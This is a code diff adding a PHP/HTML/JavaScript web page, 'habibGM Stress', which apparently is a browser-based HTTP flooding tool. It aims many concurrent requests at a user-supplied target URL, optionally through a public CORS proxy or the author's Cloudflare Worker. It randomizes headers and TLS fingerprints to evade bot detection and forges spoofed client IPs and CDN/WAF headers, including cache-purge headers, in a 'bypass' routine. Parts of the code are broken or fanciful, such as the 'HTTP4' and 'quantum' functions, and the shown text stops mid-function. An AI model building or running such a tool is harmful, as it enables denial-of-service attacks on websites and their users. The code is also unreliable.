@@ -1,0 +1,1023 @@
+<?php
+// Cek apakah ada parameter 'access' yang dikirim dari terminal
+if (!isset($_GET['access']) || $_GET['access'] !== 'authorized') {
+    // Jika tidak ada parameter, arahkan ke te.php
+    header("Location: index.php");
+    exit();
+}
+
+// Konten asli file.php anda di bawah sini...
+//echo "Selamat datang di Akses File Aman.";
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>habibGM Stress</title>
+    <style>
+        :root {
+            --bg: #0d1117;
+            --container: #161b22;
+            --text: #c9d1d9;
+            --primary: #238636;
+            --accent: #58a6ff;
+            --danger: #da3633;
+            --warning: #d2a8ff;
+            --error: #f85149;
+            --info: #e3b341;
+            --cors: #d2a8ff;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: var(--container);
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+            width: 90%;
+            max-width: 600px;
+            border: 1px solid #30363d;
+        }
+        h2 { color: var(--accent); margin-top: 0; }
+        .input-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-size: 0.9em; }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            background: var(--bg);
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            color: white;
+            box-sizing: border-box;
+            margin-bottom: 15px;
+        }
+        .slider-container {
+            width: 100%;
+            height: 60px;
+            background-color: var(--bg);
+            border: 1px solid #30363d;
+            border-radius: 50px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .slider-text {
+            color: var(--text);
+            font-weight: bold;
+            font-size: 0.85em;
+            pointer-events: none;
+            z-index: 1;
+            user-select: none;
+        }
+        #slider-thumb {
+            position: absolute;
+            left: 5px;
+            width: 50px;
+            height: 50px;
+            background-color: var(--primary);
+            border-radius: 50%;
+            cursor: grab;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2;
+            box-shadow: 0 0 15px rgba(35, 134, 54, 0.4);
+        }
+        #slider-thumb:active { cursor: grabbing; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; }
+        .stop-btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            background-color: var(--danger);
+            color: white;
+            display: none;
+        }
+        .stats-panel {
+            margin-top: 25px;
+            background: #000;
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.95em;
+        }
+        .progress-container {
+            background: #30363d;
+            height: 8px;
+            border-radius: 10px;
+            margin: 15px 0;
+            overflow: hidden;
+            position: relative;
+        }
+
+        #progress-bar {
+            height: 100%;
+            width: 0%;
+            background: #0b57d0;
+            border-radius: 10px;
+            transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        #progress-bar::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background-image: linear-gradient(
+                110deg, 
+                rgba(255, 255, 255, 0) 30%, 
+                rgba(255, 255, 255, 0.25) 45%, 
+                rgba(255, 255, 255, 0.5) 50%, 
+                rgba(255, 255, 255, 0.25) 55%, 
+                rgba(255, 255, 255, 0) 70%
+            );
+            background-size: 200% 100%;
+            animation: playstore-shimmer 1.5s infinite linear;
+        }
+
+        @keyframes playstore-shimmer {
+            0% { background-position: -200% 0; }
+            100% { background-position: 200% 0; }
+        }
+
+        .container.running {
+            border-color: var(--accent);
+            box-shadow: 0 0 20px rgba(88, 166, 255, 0.2);
+            transition: 0.5s;
+        }
+
+        .stat-row { display: flex; justify-content: space-between; margin: 6px 0; border-bottom: 1px dashed #30363d; padding-bottom: 4px; }
+        .stat-row:last-child { border-bottom: none; }
+        .success { color: #3fb950; }
+        .timeout-text { color: var(--warning); }
+        .cors-text { color: var(--cors); }
+        .error-text { color: var(--error); }
+        .info-text { color: var(--info); }
+        .status-badge { background: #30363d; padding: 2px 6px; border-radius: 4px; margin-left: 5px; font-size: 0.85em; display: inline-block; margin-bottom: 4px;}
+		.iframe-modern {
+            width: 100%;
+            max-width: 800px; /* Opsional: Batas lebar maksimal */
+            aspect-ratio: 16 / 9; /* Mengatur rasio aspek (contoh: video YouTube) */
+            margin: 0 auto; /* Opsional: Untuk meletakkan di tengah */
+        }
+
+        .iframe-modern iframe {
+            width: 100%;
+            height: 100%;
+            border: none; /* Menghilangkan garis tepi */
+            border-radius: 8px; /* Opsional: Membuat sudut sedikit membulat */
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>habibGM Stress</h2>
+        <div class="input-group">
+            <label>URL Target</label>
+            <input type="text" id="url" placeholder="https://example.com" oninput="saveData()">
+
+            <label>CORS Proxy (Opsional)</label>
+            <select id="proxy" onchange="handleProxyChange()">
+                <option value="" selected>Tanpa Proxy (Langsung ke Server)</option>
+                <option value="https://api.codetabs.com/v1/proxy?quest=">CodeTabs</option> 
+				<!--
+				<option value="https://lingering-sunset-690e.habib-fergiawan.workers.dev/?target=">Cloudflare Worker Booster</option> --> <option value="https://autumn-darkness-a2e1.habib-fergiawan.workers.dev/?target=">Cloudflare Worker Booster</option>
+            </select>
+
+            <div class="grid">
+                <div>
+                    <label>Durasi (Detik)</label>
+                    <input type="number" id="duration" value="30" oninput="saveData()">
+                </div>
+                <div>
+                    <label>Threads</label>
+                    <input type="number" id="threads" value="10">
+                </div>
+                <div>
+                    <label>Timeout (ms)</label>
+                    <input type="number" id="timeout-ms" value="2000" oninput="saveData()">
+                </div>
+            </div>
+        </div>
+
+        <div id="slider-wrapper">
+            <div class="slider-container">
+                <span class="slider-text">GESER KE KANAN UNTUK MEMULAI</span>
+                <div id="slider-thumb">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
+                        <path d="M13.172 12l-4.95-4.95 1.414-1.414L16 12l-6.364 6.364-1.414-1.414z"/>
+                    </svg>
+                </div>
+            </div>
+        </div>
+
+        <button id="stop-btn" class="stop-btn" onclick="stopTest()">HENTIKAN PENGUJIAN</button>
+
+        <div class="stats-panel">
+            <div class="stat-row">
+                <span>Status:</span>
+                <span id="status">Ready</span>
+            </div>
+            <div class="progress-container">
+                <div id="progress-bar"></div>
+            </div>
+            <div class="stat-row">
+                <span>Booster Mode:</span>
+                <span id="booster-status" class="info-text">Inactive</span>
+            </div>
+            <div class="stat-row">
+                <span>Target IP:</span>
+                <span id="target-ip" class="info-text">Menunggu...</span>
+            </div>
+            <div class="stat-row">
+                <span>Total Requests:</span>
+                <span id="total-req">0</span>
+            </div>
+            <div class="stat-row">
+                <span>X-Fetch-Mode:</span>
+                <span id="fetch_mode_ui" class="info-text">kosong</span>
+            </div>
+            <div class="stat-row">
+                <span>X-HTTP4-Experimental-Mode:</span>
+                <span id="fetch_mode_uih4" class="info-text">kosong</span>
+            </div>
+            <div class="stat-row">
+                <span>Request Terkirim (Berhasil):</span>
+                <span id="req-terkirim" class="success">0</span>
+            </div>
+            <div class="stat-row">
+                <span>Request Gagal (Ke Target):</span>
+                <span id="req-gagal" class="error-text">0</span>
+            </div>
+            <div class="stat-row">
+                <span>Origin Hits:</span>
+                <span id="origin-hits" class="success">0</span>
+            </div>
+            <div class="stat-row">
+                <span>Timeouts:</span>
+                <span id="timeouts" class="timeout-text">0</span>
+            </div>
+            <div class="stat-row">
+                <span>CORS Errors:</span>
+                <span id="cors-errors" class="cors-text">0</span>
+            </div>
+            <div class="stat-row">
+                <span>Local Errors:</span>
+                <span id="local-errors" class="error-text">0</span>
+            </div>
+            <div class="stat-row" style="flex-direction: column; align-items: flex-start;">
+                <span style="margin-bottom: 5px;">HTTP Status Codes:</span>
+                <div id="http-statuses" style="display: flex; flex-wrap: wrap; gap: 5px;">-</div>
+            </div>
+            <div class="stat-row" style="margin-top: 10px;">
+                <span>Waktu Tersisa:</span>
+                <span id="timer">0s</span>
+            </div>
+        </div>
+		<!-- <div class="iframe-modern">
+        <iframe src="../dos/ddos/index.html" allowfullscreen></iframe>
+    </div> -->
+    </div>
+
+<script>
+    let isRunning = false;
+    let requestCount = 0;
+    let originHits = 0;
+    let timeoutCount = 0;
+    let corsErrors = 0;
+    let localErrors = 0;
+    let stopTime = 0;
+    let statusCodes = {};
+    let dashboardInterval;
+
+    const referrers = [
+        'https://www.google.com/', 'https://www.google.co.id/', 'https://www.facebook.com/', 
+        'https://t.co/', 'https://www.bing.com/', 'https://www.cloudflare.com/', 
+        'https://edge.nyc.mn/', 'https://duckduckgo.com/', 'https://yandex.com/',
+        'https://search.yahoo.com/', 'https://www.baidu.com/', 'https://www.reddit.com/',
+        'https://www.instagram.com/', 'https://www.tiktok.com/', 'https://www.linkedin.com/',
+        'https://www.youtube.com/', 'https://m.youtube.com/', 'https://m.facebook.com/', 'https://l.instagram.com/',
+        'https://github.com/', 'https://bunny.net/', 'https://www.litespeedtech.com/',
+        'https://1.1.1.1/', 'https://dns.google/', 'https://aws.amazon.com/',
+        'https://fastly.net/', 'https://en.wikipedia.org/', 'https://news.ycombinator.com/',
+        'https://medium.com/', 'https://stackoverflow.com/'
+    ];
+
+    const language_header = [
+        'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9',
+        'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'cs;q=0.5', 'nl-NL,nl;q=0.9',
+        'nn-NO,nn;q=0.9', 'or-IN,or;q=0.9', 'pa-IN,pa;q=0.9', 'pl-PL,pl;q=0.9',
+        'pt-BR,pt;q=0.9', 'pt-PT,pt;q=0.9', 'ro-RO,ro;q=0.9', 'ru-RU,ru;q=0.9',
+        'si-LK,si;q=0.9', 'sk-SK,sk;q=0.9', 'sl-SI,sl;q=0.9', 'sq-AL,sq;q=0.9',
+        'sr-Cyrl-RS,sr;q=0.9', 'sr-Latn-RS,sr;q=0.9', 'sv-SE,sv;q=0.9', 'sw-KE,sw;q=0.9',
+        'ta-IN,ta;q=0.9', 'te-IN,te;q=0.9', 'th-TH,th;q=0.9', 'tr-TR,tr;q=0.9',
+        'uk-UA,uk;q=0.9', 'ur-PK,ur;q=0.9', 'uz-Latn-UZ,uz;q=0.9', 'vi-VN,vi;q=0.9',
+        'zh-CN,zh;q=0.9', 'zh-HK,zh;q=0.9', 'zh-TW,zh;q=0.9', 'am-ET,am;q=0.8',
+        'as-IN,as;q=0.8', 'az-Cyrl-AZ,az;q=0.8', 'bn-BD,bn;q=0.8', 'bs-Cyrl-BA,bs;q=0.8',
+        'bs-Latn-BA,bs;q=0.8', 'dz-BT,dz;q=0.8', 'fil-PH,fil;q=0.8', 'fr-CA,fr;q=0.8',
+        'fr-CH,fr;q=0.8', 'fr-BE,fr;q=0.8', 'fr-LU,fr;q=0.8', 'gsw-CH,gsw;q=0.8',
+        'ha-Latn-NG,ha;q=0.8', 'hr-BA,hr;q=0.8', 'ig-NG,ig;q=0.8', 'ii-CN,ii;q=0.8',
+        'is-IS,is;q=0.8', 'jv-Latn-ID,jv;q=0.8', 'ka-GE,ka;q=0.8', 'kkj-CM,kkj;q=0.8',
+        'kl-GL,kl;q=0.8', 'km-KH,km;q=0.8', 'kok-IN,kok;q=0.8', 'ks-Arab-IN,ks;q=0.8',
+        'lb-LU,lb;q=0.8', 'ln-CG,ln;q=0.8', 'mn-Mong-CN,mn;q=0.8', 'mr-MN,mr;q=0.8',
+        'ms-BN,ms;q=0.8', 'mt-MT,mt;q=0.8', 'mua-CM,mua;q=0.8', 'nds-DE,nds;q=0.8',
+        'ne-IN,ne;q=0.8', 'nso-ZA,nso;q=0.8', 'oc-FR,oc;q=0.8', 'pa-Arab-PK,pa;q=0.8',
+        'ps-AF,ps;q=0.8', 'quz-BO,quz;q=0.8', 'quz-EC,quz;q=0.8', 'quz-PE,quz;q=0.8',
+        'rm-CH,rm;q=0.8', 'rw-RW,rw;q=0.8', 'sd-Arab-PK,sd;q=0.8', 'se-NO,se;q=0.8',
+        'si-LK,si;q=0.8', 'smn-FI,smn;q=0.8', 'sms-FI,sms;q=0.8', 'syr-SY,syr;q=0.8',
+        'tg-Cyrl-TJ,tg;q=0.8', 'ti-ER,ti;q=0.8', 'tk-TM,tk;q=0.8', 'tn-ZA,tn;q=0.8',
+        'ug-CN,ug;q=0.8', 'uz-Cyrl-UZ,uz;q=0.8', 've-ZA,ve;q=0.8', 'wo-SN,wo;q=0.8',
+        'xh-ZA,xh;q=0.8', 'yo-NG,yo;q=0.8', 'zgh-MA,zgh;q=0.8', 'zu-ZA,zu;q=0.8'
+    ];
+
+    const menerima = [
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+    ];
+
+    const encoding = [
+        '*', '*/*', 'gzip', 'gzip, deflate, br', 'compress, gzip', 'deflate, gzip',
+        'gzip, identity', 'gzip, deflate', 'br', 'br;q=1.0, gzip;q=0.8, *;q=0.1',
+        'gzip;q=1.0, identity; q=0.5, *;q=0', 'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
+        'compress;q=0.5, gzip;q=1.0', 'identity', 'gzip, compress', 'compress, deflate',
+        'compress', 'gzip, deflate, br', 'deflate', 'gzip, deflate, lzma, sdch',
+        'deflate', 'gzip, deflate, br', 'gzip, br', 'deflate', 'gzip, deflate, br, zstd',
+        'zstd, br, gzip',
+        'gzip, deflate, lzma, sdch', 'deflate', 'identity'
+    ];
+
+    const cache_header = [
+        'max-age=0', 'no-cache', 'no-store', 'pre-check=0', 'post-check=0', 
+        'must-revalidate', 'proxy-revalidate', 's-maxage=604800', 
+        'no-cache, no-store,private, max-age=0, must-revalidate',
+        'no-cache, no-store,private, s-maxage=604800, must-revalidate',
+        'no-cache, no-store,private, max-age=604800, must-revalidate'
+    ];
+
+    const nm = ["110.0.0.0", "111.0.0.0", "112.0.0.0", "113.0.0.0", "114.0.0.0", "115.0.0.0", "116.0.0.0", "117.0.0.0", "118.0.0.0", "119.0.0.0"];
+    const nmx = ["120.0", "119.0", "118.0", "117.0", "116.0", "115.0", "114.0", "113.0", "112.0", "111.0"];
+    const nmx1 = ["105.0.0.0", "104.0.0.0", "103.0.0.0", "102.0.0.0", "101.0.0.0", "100.0.0.0", "99.0.0.0", "98.0.0.0", "97.0.0.0"];
+    const sysos = [
+        "Windows 1.01", "Windows 1.02", "Windows 1.03", "Windows 1.04", "Windows 2.01",
+        "Windows 3.0", "Windows NT 3.1", "Windows NT 3.5", "Windows 95", "Windows 98",
+        "Windows 2006", "Windows NT 4.0", "Windows 95 Edition", "Windows 98 Edition",
+        "Windows Me", "Windows Business", "Windows XP", "Windows 7", "Windows 8",
+        "Windows 10 version 1507", "Windows 10 version 1511", "Windows 10 version 1607",
+        "Windows 10 version 1703"
+    ];
+    const winarch = [
+        "x86-16", "x86-16, IA32", "IA-32", "IA-32, Alpha, MIPS", 
+        "IA-32, Alpha, MIPS, PowerPC", "Itanium", "x86_64", "IA-32, x86-64", 
+        "IA-32, x86-64, ARM64", "x86-64, ARM64", "ARMv4, MIPS, SH-3", 
+        "ARMv4", "ARMv5", "ARMv7", "IA-32, x86-64, Itanium", "x86-64, Itanium"
+    ];
+    const winch = [
+        "2012 R2", "2019 R2", "2012 R2 Datacenter", "Server Blue", 
+        "Longhorn Server", "Whistler Server", "Shell Release", "Daytona", 
+        "Razzle", "HPC 2008"
+    ];
+    const rd = ["221988", "1287172", "87238723", "8737283", "8238232", "63535464", "121212"];
+    
+    const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
+    const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
+
+    // FUNGSI TAMBAHAN AGAR TIDAK ERROR SAAT ONLOAD
+   function showDashboard() {
+    console.log("%c[SYSTEM] Engine habibGM Aktif", "color: #3fb950; font-weight: bold;");
+    
+    return setInterval(() => {
+        if(!isRunning) return;
+        const currentTarget = document.getElementById('url').value;
+        const proxyVal = document.getElementById('proxy').value;
+        const fetchMode = proxyVal ? 'CORS (via Proxy)' : 'NO-CORS (Direct)';
+
+        console.clear();
+        console.log(
+            `%c[SYSTEM] Engine habibGM Aktif\n` +
+            `%c[TARGET] %c${currentTarget}\n` +
+            `%c[MODE]   %c${fetchMode.toUpperCase()}\n` +
+            `%c[STATUS] %cMemulai Flooding...`,
+            "color: #3fb950; font-weight: bold; font-size: 14px;",
+            "color: #58a6ff; font-weight: bold;", "color: #c9d1d9;",
+            "color: #d2a8ff; font-weight: bold;", "color: #c9d1d9;",
+            "color: #e3b341; font-weight: bold;", "color: #3fb950;"
+        );
+        
+        console.log(`%c[STATS] Requests: ${requestCount} | Hits: ${originHits} | Timeouts: ${timeoutCount} | CORS Errs: ${corsErrors}`, "color: #8b949e;");
+    }, 800);
+}
+
+    function generateJA3Fingerprint() {
+        const ciphers = [
+            'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
+            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256', 'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
+            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384', 'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
+            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256', 'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
+            'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA'
+        ];
+        const signatureAlgorithms = [
+            'ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256',
+            'ecdsa_secp384r1_sha384', 'rsa_pss_rsae_sha384', 'rsa_pkcs1_sha384'
+        ];
+        const curves = ['X25519', 'secp256r1', 'secp384r1'];
+        const extensions = ['0', '5', '10', '13', '16', '18', '21', '23', '27', '35', '43', '45', '51', '65281', '17513'];
+
+        const shuffledCiphers = shuffle([...ciphers]).slice(0, Math.floor(Math.random() * 4) + 6);
+        const shuffledSigAlgs = shuffle([...signatureAlgorithms]).slice(0, Math.floor(Math.random() * 2) + 3);
+        const shuffledCurves = shuffle([...curves]);
+        const shuffledExtensions = shuffle([...extensions]).slice(0, Math.floor(Math.random() * 3) + 10);
+
+        return {
+            ciphers: shuffledCiphers,
+            signatureAlgorithms: shuffledSigAlgs,
+            curves: shuffledCurves,
+            extensions: shuffledExtensions,
+            padding: Math.random() > 0.3 ? getRandomInt(0, 100) : 0
+        };
+    }
+
+    const kuntul = ["navigate", "same-origin", "no-cors", "cors"];
+
+    window.onload = function() {
+        const loginStatus = localStorage.getItem('isLoggedIn');
+        if (loginStatus === 'true') {
+            showDashboard();
+        }
+        if(localStorage.getItem('targetUrl')) {
+            document.getElementById('url').value = localStorage.getItem('targetUrl');
+        }
+        if(localStorage.getItem('testDuration')) {
+            document.getElementById('duration').value = localStorage.getItem('testDuration');
+        }
+        if(localStorage.getItem('proxySelection')) {
+            document.getElementById('proxy').value = localStorage.getItem('proxySelection');
+        }
+        if(localStorage.getItem('timeoutMs')) {
+            document.getElementById('timeout-ms').value = localStorage.getItem('timeoutMs');
+        }
+    };
+
+    function saveData() {
+        localStorage.setItem('targetUrl', document.getElementById('url').value);
+        localStorage.setItem('testDuration', document.getElementById('duration').value);
+        localStorage.setItem('proxySelection', document.getElementById('proxy').value);
+        localStorage.setItem('timeoutMs', document.getElementById('timeout-ms').value);
+    }
+
+    function handleProxyChange() {
+        saveData();
+        const proxyValue = document.getElementById('proxy').value;
+        const threadsInput = document.getElementById('threads');
+        const waktunya = document.getElementById('timeout-ms');
+        if (proxyValue.includes('codetabs')) {
+            threadsInput.value = 50;
+            waktunya.value = 12000;
+        } else {
+            threadsInput.value = 100;
+            waktunya.value = 15000;
+        }
+    }
+
+    function generateRandomString(minLength, maxLength) {
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$_&-+/*!?~|•√π÷×§∆£¢€¥^°©®™✓%,.∞¥';
+        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+        let result = '';
+        for (let i = 0; i < length; i++) {
+            const randomIndex = Math.floor(Math.random() * characters.length);
+            result += characters[randomIndex];
+        }
+        return result;
+    }
+
+    function generateHTTP2Fingerprint() {
+        const settings = {
+            HEADER_TABLE_SIZE: [4096, 16384],
+            ENABLE_PUSH: [0, 1],
+            MAX_CONCURRENT_STREAMS: [1000, 2000],
+            INITIAL_WINDOW_SIZE: [65535, 262144],
+            MAX_FRAME_SIZE: [16384, 65536],
+            MAX_HEADER_LIST_SIZE: [8192, 32768],
+            ENABLE_CONNECT_PROTOCOL: [0, 1]
+        };
+        const http2Settings = {};
+        for (const [key, values] of Object.entries(settings)) {
+            http2Settings[key] = values[Math.floor(Math.random() * values.length)];
+        }
+        return http2Settings;
+    }
+
+    function generateHTTP3Fingerprint() {
+        const h3Settings = {
+            QUIC_VERSION: ['h3', 'h3-29', 'h3-32'],
+            MAX_CONCURRENT_STREAMS_BIDI: [100, 128, 250],
+            MAX_CONCURRENT_STREAMS_UNI: [100, 128, 250],
+            INITIAL_MAX_DATA: [1048576, 10485760],
+            INITIAL_MAX_STREAM_DATA_BIDI_LOCAL: [65536, 131072],
+            QPACK_MAX_TABLE_CAPACITY: [0, 4096, 16384],
+            QPACK_BLOCKED_STREAMS: [0, 16, 100]
+        };
+        const fingerprint = {};
+        for (const [key, values] of Object.entries(h3Settings)) {
+            fingerprint[key] = values[Math.floor(Math.random() * values.length)];
+        }
+        return JSON.stringify(fingerprint);
+    }
+// Tambahkan ke dalam script yang sudah ada
+function generateALPN() {
+    const protocols = [
+        'h3', 'h3-29', 'h3-32', // Standar HTTP/3
+        'h4', 'h4-draft-01',    // Eksperimental HTTP/4
+        'quic', 'hq-29',        // QUIC mentah
+        'spdy/3.1', 'h2'        // Legacy fallback
+    ];
+    // Mengacak urutan ALPN untuk membingungkan deteksi bot
+    return shuffle([...protocols]).slice(0, getRandomInt(1, 3));
+}
+
+function generateHTTP4Fingerprint() {
+    const h4Settings = {
+        "transport": "QUIC-v2",
+        "alpn": generateALPN(),
+        "congestion_control": "BBRv3", // Simulasi algoritma terbaru Google
+        "flow_control_window": 25165824,
+        "max_data_bidi": 10485760,
+        "priority_scheme": "extensible-priority-01"
+    };
+    return JSON.stringify(h4Settings);
+}
+
+function generateQuantumEntropy() {
+    // Membuat string acak yang sangat panjang untuk mensimulasikan token enkripsi kuantum
+    return btoa(Math.random().toString(36).repeat(5));
+}
+    function shuffle(array) {
+        for (let i = array.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [array[i], array[j]] = [array[j], array[i]];
+        }
+        return array;
+    }
+
+    function getRandomInt(min, max) {
+        return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+
+    function generateRandomIPForCountry(country) {
+        const ranges = {
+            'USA': ['104.16', '162.158', '172.64', '192.0', '199.16'],
+            'Germany': ['95.116', '2.160', '31.16', '176.198', '178.200'],
+            'Japan': ['106.154', '1.33', '122.197', '210.138', '114.160'],
+            'Brazil': ['177.126', '186.200', '187.1', '189.1', '201.0'],
+            'Indonesia': ['114.124', '103.10', '125.160', '180.240', '202.67'],
+            'France': ['92.184', '37.160', '78.224', '80.12', '176.128'],
+            'Russia': ['95.161', '188.162', '213.87', '178.64', '37.144'],
+            'UK': ['25.0', '51.0', '62.24', '188.39', '193.32'],
+            'China': ['1.68', '14.116', '113.104', '183.128', '223.64'],
+            'India': ['103.20', '117.192', '157.32', '223.176', '49.32'],
+            'Australia': ['1.120', '27.252', '101.160', '110.140', '120.144'],
+            'Canada': ['24.200', '64.228', '99.192', '174.88', '184.160'],
+            'Singapore': ['111.65', '103.25', '175.156', '202.166'],
+            'Netherlands': ['94.208', '82.161', '145.53', '213.124'],
+            'SouthKorea': ['121.128', '211.234', '112.144', '1.208']
+        };
+        const countryPrefixes = ranges[country] || ['1.1'];
+        const prefix = countryPrefixes[Math.floor(Math.random() * countryPrefixes.length)];
+        return prefix + '.' + getRandomInt(1, 254) + '.' + getRandomInt(1, 254);
+    }
+
+    function generateValidPublicIP() {
+        const getRandom = (min, max) => Math.floor(Math.random() * (max - min + 1) + min);
+        let firstOctet;
+        while (true) {
+            firstOctet = getRandom(1, 223);
+            const isReserved = (firstOctet === 10) || (firstOctet === 172) || (firstOctet === 192) || (firstOctet === 127) || (firstOctet === 169) || (firstOctet === 100);
+            if (!isReserved) break;
+        }
+        let secondOctet = getRandom(0, 255);
+        if (firstOctet === 172 && secondOctet >= 16 && secondOctet <= 31) return generateValidPublicIP(); 
+        if (firstOctet === 192 && secondOctet === 168) return generateValidPublicIP();
+        return `${firstOctet}.${secondOctet}.${getRandom(0, 255)}.${getRandom(1, 254)}`;
+    }
+
+    function generateBypassPayload() {
+        const payloads = [
+            `{"id":${Math.random()},"ref":"direct","mode":"cors"}`,
+            `action=login&user=admin&token=${Math.random().toString(36)}`,
+            `query { user(id: ${Math.floor(Math.random()*100)}) { name emails } }`
+        ];
+        return payloads[Math.floor(Math.random() * payloads.length)];
+    }
+
+    function getCDNSpecificHeaders(host) {
+      const traceId = `Root=1-${timestamp}-${Math.random().toString(16).substring(2, 10)}`;
+        const timestamp = Math.floor(Date.now() / 1000); 
+		const bibib = generateValidPublicIP();
+    const randomIP = generateRandomIPForCountry('Brazil');
+        return {
+            'CF-Visitor': '{"scheme":"https"}',
+            'CF-Connecting-IP': dynamicUrl, // Biasanya diisi IP asli client
+            'CF-RAY': `${Math.random().toString(16).substring(2, 12)}-CGK`,
+            'X-Forwarded-Proto': 'https',
+            'X-Amz-Target': 'CloudFront',
+            'X-Amzn-Trace-Id': `Root=1-${Math.floor(Date.now()/1000)}-${Math.random().toString(16).substring(2,10)}`,
+            'X-Amz-Target': 'CloudFront',
+            'X-Amzn-Trace-Id': traceId,
+            'Via': '2.0 cloudfront',
+            'X-Cache': 'Miss from cloudfront',
+            'X-Pull': 'BunnyCDN',
+            'CDN-Loop': 'BunnyCDN',
+            'X-Forwarded-For': dynamicUrl,
+            'X-LSCACHE': 'on',
+            'X-LiteSpeed-Cache-Control': 'public,max-age=1800',
+            'X-Litespeed-Purge': '*',
+            'X-Powered-By': 'OpenResty',
+            'X-Proxy-Cache': 'MISS',
+            'X-Real-IP': dynamicUrl,
+            'X-Cloud-Trace-Context': `${Math.random().toString(16).substring(2, 32)}/1;o=1`,
+            'Via': '1.1 google',
+            'Forwarded': `for=127.0.0.7;proto=https`,
+            'X-A10-Next-Hop': 'Internal',
+            'X-Forwarded-For': dynamicUrl,
+            'X-F5-Forwarded-For': dynamicUrl,
+            'X-WA-Info': '1',
+            'X-F5-Source-IP': dynamicUrl,
+            'X-Armor-Request-ID': Math.random().toString(36).substring(7),
+            'X-Armor-Service': 'WAF',
+            'X-Amz-Cf-Id': Math.random().toString(36).substring(2, 15),
+            'X-Amz-Security-Token': 'shield-protection-v1',
+            'X-Shield-Request-ID': traceId,
